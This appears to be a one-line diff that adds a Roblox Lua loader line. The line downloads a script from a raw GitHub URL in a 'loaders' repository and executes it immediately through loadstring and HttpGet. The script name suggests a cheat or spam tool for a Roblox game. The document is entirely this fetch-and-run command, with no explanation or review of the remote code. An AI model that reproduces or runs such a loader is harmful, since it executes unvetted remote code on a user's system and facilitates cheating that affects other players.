@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/cargo-run-an-airline-spam3-eop36sglmdf4d7.lua"))()
